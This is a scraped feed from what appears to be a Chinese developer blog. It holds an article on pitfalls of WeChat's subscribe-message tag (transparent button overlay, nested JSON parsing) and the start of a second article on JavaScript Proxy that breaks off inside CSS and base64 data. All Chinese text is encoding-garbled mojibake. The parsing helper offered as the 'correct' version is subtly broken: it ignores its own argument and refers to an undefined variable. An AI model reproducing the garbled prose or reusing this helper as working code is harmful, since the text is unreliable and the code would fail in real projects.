<li><strong>æ ·å¼éš”ç¦»</strong>ï¼šä½ å¤–éƒ¨å†™çš„ CSS æ ·å¼ï¼Œæ ‡ç­¾é‡Œé¢æ ¹æœ¬ä¸è®¤ã€‚</li>
<li><strong>æ— æ³•ä¸»åŠ¨è§¦å‘</strong>ï¼šä½ ä¸èƒ½å†™ä¸ª JS å‡½æ•°å»è°ƒç”¨å®ƒï¼Œå¿…é¡»ç”±ç”¨æˆ·ç‚¹å‡»è¿™ä¸ªæ ‡ç­¾æ‰èƒ½è§¦å‘å¼¹çª—ã€‚</li>
</ol>
<p>æ‰€ä»¥ï¼Œåˆ«æƒ³ç€é€šè¿‡ JS é€»è¾‘å»æ§åˆ¶å¼¹çª—äº†ï¼Œè€è€å®å®æŠŠæ ‡ç­¾å†™åœ¨é¡µé¢ä¸Šå§ã€‚</p>
<hr/>
<h2 data-id="heading-1">å‘ç‚¹äºŒï¼šæ ·å¼æ­»æ´»è°ƒä¸å‡†ï¼Ÿï¼ˆé™„è§£å†³æ–¹æ¡ˆï¼‰</h2>
<p>è¿™æ˜¯æœ€æå¿ƒæ€çš„åœ°æ–¹ã€‚æˆ‘ä»¬çš„æ´»åŠ¨é¡µä¸€èˆ¬éƒ½ç”¨ <code>rem</code> åšé€‚é…ï¼Œç»“æœæˆ‘æŠŠä»£ç æ”¾è¿›å»ä¸€çœ‹ï¼ŒæŒ‰é’®å°å¾—åƒèš‚èšã€‚</p>
<p><strong>åŸå› </strong>ï¼šæ ‡ç­¾å†…éƒ¨çš„æ²™ç®±ç¯å¢ƒ<strong>ä¸ç»§æ‰¿</strong>å¤–éƒ¨ <code>html</code> æ ¹èŠ‚ç‚¹çš„ <code>font-size</code>ã€‚ä½ åœ¨å¤–é¢è®¾äº† <code>1rem = 100px</code>ï¼Œå®ƒåœ¨é‡Œé¢åªè®¤æµè§ˆå™¨çš„é»˜è®¤å€¼ï¼ˆé€šå¸¸æ˜¯ 16pxï¼‰ï¼Œæ‰€ä»¥ä½ çš„ <code>2rem</code> åœ¨é‡Œé¢å°±å˜æˆäº† <code>32px</code>ã€‚</p>
<p><strong>æ€ä¹ˆè§£ï¼Ÿ</strong>
åœ¨æ ‡ç­¾é‡Œçš„ <code>&lt;style&gt;</code> å†™æ­» <code>pxæˆ–è€…vw</code>ï¼Ÿå¤ªéº»çƒ¦äº†ï¼Œè¿˜å¾—ç®—ã€‚
<strong>æœ€ç»ˆæ–¹æ¡ˆï¼šé€æ˜å±‚è¦†ç›–æ³•ï¼ˆæ¨èï¼‰</strong></p>
<p>æ—¢ç„¶æ ‡ç­¾é‡Œçš„æ ·å¼éš¾è°ƒï¼Œé‚£æˆ‘ä»¬å¹²è„†<strong>ä¸è°ƒäº†</strong>ã€‚</p>
<ol>
<li><strong>å¤–éƒ¨</strong>ï¼šæŒ‰æ­£å¸¸å†™æ³•ï¼Œç”¨ <code>rem</code> å†™ä¸€ä¸ªæ¼‚äº®çš„æŒ‰é’®ï¼Œæƒ³æ€ä¹ˆèŠ±å“¨æ€ä¹ˆèŠ±å“¨ã€‚</li>
<li><strong>å†…éƒ¨</strong>ï¼šæŠŠ <code>&lt;wx-open-subscribe&gt;</code> æ ‡ç­¾ç›–åœ¨è¿™ä¸ªæŒ‰é’®ä¸Šé¢ï¼Œè®¾ç½®é€æ˜åº¦ä¸º 0ã€‚</li>
</ol>
<p>è¿™æ ·ç”¨æˆ·çœ‹ç€æ˜¯ç‚¹äº†ä½ çš„æ¼‚äº®æŒ‰é’®ï¼Œå®é™…ä¸Šç‚¹çš„æ˜¯é€æ˜çš„å¾®ä¿¡æ ‡ç­¾ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å¤–éƒ¨å®¹å™¨ï¼šæ§åˆ¶æ•´ä½“ä½ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"subscribe-wrapper"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"position: relative; display: inline-block;"</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 1. ä½ çš„æ¼‚äº®æŒ‰é’®ï¼ˆè§†è§‰å±‚ï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"my-custom-btn"</span>&gt;</span>ğŸŒŸ è®¢é˜…é€šçŸ¥ ğŸŒŸ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 2. å¾®ä¿¡æ ‡ç­¾ï¼ˆé€»è¾‘å±‚ï¼‰ï¼šç»å¯¹å®šä½è¦†ç›–åœ¨ä¸Šé¢ï¼Œé€æ˜ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">wx-open-subscribe</span> <span class="hljs-attr">template</span>=<span class="hljs-string">"ä½ çš„æ¨¡æ¿ID"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"subscribe-btn"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"position: absolute; top:0; left:0; width:100%; height:100%; opacity: 0;"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/wxtag-template"</span>&gt;</span><span class="xml">
            <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
                <span class="hljs-comment">/* å…³é”®ï¼šæŠŠå†…éƒ¨æŒ‰é’®æ’‘æ»¡æ•´ä¸ªåŒºåŸŸ */</span>
                <span class="hljs-selector-class">.trigger-btn</span> {
                    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
                    <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
                    <span class="hljs-attribute">background</span>: transparent;
                    <span class="hljs-attribute">border</span>: none;
                }
            </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"trigger-btn"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">wx-open-subscribe</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>è¿™æ ·ä¸€æ¥ï¼Œæ ·å¼é—®é¢˜ç›´æ¥ç»•è¿‡å»äº†ï¼Œå®Œç¾é€‚é…å„ç§å±å¹•ã€‚</p>
<hr/>
<h2 data-id="heading-2">å‘ç‚¹ä¸‰ï¼šå¥‡è‘©çš„è¿”å›å€¼è§£æ</h2>
<p>å¥½ä¸å®¹æ˜“å¼¹çª—å‡ºæ¥äº†ï¼Œç”¨æˆ·ç‚¹äº†â€œå…è®¸â€ï¼Œç»“æœå›è°ƒé‡Œçš„æ•°æ®æ ¼å¼åˆç»™æˆ‘æ•´ä¸ä¼šäº†ã€‚</p>
<p><code>e.detail.subscribeDetails</code> è¿”å›çš„ä¸æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>å­—ç¬¦ä¸²</strong>ã€‚
ä½ ä»¥ä¸º <code>JSON.parse</code> ä¸€æ¬¡å°±å®Œäº†ï¼Ÿå¤©çœŸã€‚
è§£æå‡ºæ¥çš„å€¼ï¼Œå¯¹åº”çš„ value <strong>å±…ç„¶è¿˜æ˜¯ä¸ªå­—ç¬¦ä¸²</strong>ï¼è¿™æ˜¯ä»€ä¹ˆâ€œå¥—å¨ƒâ€æ“ä½œï¼Ÿ</p>
<p><strong>é”™è¯¯çš„å†™æ³•ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŠ¥é”™ï¼</span>
<span class="hljs-keyword">var</span> res = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">detail</span>.<span class="hljs-property">subscribeDetails</span>);
<span class="hljs-keyword">if</span> (res[<span class="hljs-string">'æ¨¡æ¿ID'</span>].<span class="hljs-property">status</span> === <span class="hljs-string">'accept'</span>) { ... } 
</code></pre>
<p><strong>æ­£ç¡®çš„å†™æ³•ï¼ˆå°è£…ä¸ªå‡½æ•°ä¿å¹³å®‰ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è§£æå‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getSubscribeStatus</span>(<span class="hljs-params">detailsStr, templateId</span>) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> detail = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">detail</span>.<span class="hljs-property">subscribeDetails</span>);
        <span class="hljs-keyword">const</span> status = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(detail[templateId]).<span class="hljs-property">status</span>;
        
        <span class="hljs-keyword">return</span> status; <span class="hljs-comment">// è¿”å› 'accept', 'reject' ç­‰çŠ¶æ€</span>
    } <span class="hljs-keyword">catch</span> (e) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è§£æè®¢é˜…çŠ¶æ€å¤±è´¥'</span>, e);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}

<span class="hljs-comment">// è°ƒç”¨</span>
btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'success'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
    <span class="hljs-keyword">var</span> status = <span class="hljs-title function_">getSubscribeStatus</span>(e.<span class="hljs-property">detail</span>.<span class="hljs-property">subscribeDetails</span>, <span class="hljs-string">'ä½ çš„æ¨¡æ¿ID'</span>);
    <span class="hljs-keyword">if</span> (status === <span class="hljs-string">'accept'</span>) {
        <span class="hljs-title function_">alert</span>(<span class="hljs-string">'è®¢é˜…æˆåŠŸï¼'</span>);
    }
});
</code></pre>
<hr/>
<h2 data-id="heading-3">å…¶ä»–å‡ ä¸ªå®¹æ˜“è¸©çš„é›·</h2>
<ol>
<li>
<p><strong>çœŸæœºï¼çœŸæœºï¼çœŸæœºï¼</strong>
å¾®ä¿¡å¼€å‘è€…å·¥å…·å¯¹è¿™ä¸ªæ ‡ç­¾çš„æ”¯æŒå¾ˆè¿·ï¼Œåªä¼šä½¿ç”¨å†…ç½®çš„ä¸€å¥—æ¨¡æ¿IDï¼Œä¸ä¼šä½¿ç”¨ä½ æ‰€ä¼ é€’çš„æ¨¡æ¿IDï¼Œè€Œä¸”æœ‰æ—¶å€™æ ·å¼ä¸å¯¹ï¼Œæœ‰æ—¶å€™ç‚¹å‡»æ²¡ååº”ã€‚<strong>ä¸€å®šè¦ç”¨çœŸæœºæµ‹è¯•</strong>ï¼Œä»¥çœŸæœºè¡¨ç°ä¸ºå‡†ã€‚</p>
</li>
<li>
<p><strong>æ¨¡æ¿IDå½’å±æƒ</strong>
å¦‚æœä½ ç‚¹å‡»æŒ‰é’®æ²¡æœ‰ä»»ä½•ååº”ï¼Œæˆ–è€… <code>error</code> äº‹ä»¶æŠ¥é”™ ï¼Œå…ˆåˆ«æ€€ç–‘ä»£ç ã€‚å»æ£€æŸ¥ä¸€ä¸‹è¿™ä¸ªæ¨¡æ¿ ID æ˜¯å¦æœ‰æ•ˆ(æ˜¯å¦è¢«åˆ é™¤)ï¼Œæ˜¯ä¸æ˜¯å±äºå½“å‰é¡µé¢çš„å…¬ä¼—å·ï¼ˆAppIDï¼‰ã€‚</p>
</li>
<li>
<p><strong>è§†å£ç¼©æ”¾ï¼ˆViewportï¼‰é—®é¢˜</strong>
å¦‚æœä½ çš„é¡µé¢ç”¨äº† <code>width=750</code> è¿™ç§ç¼©æ”¾æ–¹æ¡ˆï¼Œå¾®ä¿¡åŸç”Ÿçš„å¼¹çª—ä¹Ÿä¼šè·Ÿç€è¢«ç¼©å°ï¼Œå¯¼è‡´å­—å°å¾—çœ‹ä¸æ¸…ã€‚
å»ºè®®æ”¹ç”¨æ ‡å‡†çš„ <code>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</code>ï¼Œé…åˆ <code>rem</code> å¸ƒå±€ï¼Œè¿™æ ·åŸç”Ÿç»„ä»¶æ‰èƒ½æ­£å¸¸æ˜¾ç¤ºã€‚</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-4">æ€»ç»“</h2>
<p>æå®šå¾®ä¿¡è®¢é˜…æ¶ˆæ¯ï¼Œæ ¸å¿ƒå°±ä¸‰å¥è¯ï¼š</p>
<ol>
<li><strong>æ”¾å¼ƒ APIï¼Œæ‹¥æŠ±æ ‡ç­¾ã€‚</strong></li>
<li><strong>æ ·å¼åˆ«ç¡¬åˆšï¼Œé€æ˜è¦†ç›–æœ€é¦™ã€‚</strong></li>
<li><strong>è¿”å›å€¼æ˜¯å¥—å¨ƒï¼Œå¤šå±‚è§£æè¦è·Ÿä¸Šã€‚</strong></li>
</ol>
<p>å¸Œæœ›èƒ½å¸®åˆ°æ­£åœ¨è¸©å‘çš„ä½ ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Œâœï¸JSåŸå­ç¬”è®° ã€é›¶åŸºç¡€åƒé€ Proxy æ•°æ®å“åº”å¼]]></title>    <link>https://juejin.cn/post/7589201772118016006</link>    <guid>https://juejin.cn/post/7589201772118016006</guid>    <pubDate>2025-12-29T13:16:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772118016006" data-draft-id="7589201772117966854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Œâœï¸JSåŸå­ç¬”è®° ã€é›¶åŸºç¡€åƒé€ Proxy æ•°æ®å“åº”å¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-29T13:16:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Maxkim"/> <meta itemprop="url" content="https://juejin.cn/user/2768993424260451"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Œâœï¸JSåŸå­ç¬”è®° ã€é›¶åŸºç¡€åƒé€ Proxy æ•°æ®å“åº”å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2768993424260451/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Maxkim
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:16:57.000Z" title="Mon Dec 29 2025 13:16:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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